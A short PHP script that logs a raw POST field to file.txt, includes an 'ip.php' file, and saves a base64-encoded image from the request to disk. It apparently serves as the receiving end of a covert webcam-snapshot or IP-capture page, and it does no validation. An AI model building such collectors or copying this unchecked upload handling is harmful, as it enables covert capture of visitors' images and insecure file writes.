<?php

include('ip.php');



$handle=fopen("file.txt","a");
fwrite($handle, $_POST['abc']);

    
    $img = $_POST['image'];
    
  
    $image_parts = explode(";base64,", $img);
    $image_type_aux = explode("image/", $image_parts[0]);
    $image_type = $image_type_aux[1];
  
    $image_base64 = base64_decode($image_parts[1]);
    $fileName = uniqid() . '.jpeg';
  
    $file = $fileName;
    file_put_contents($file, $image_base64);
	?>
  
    
  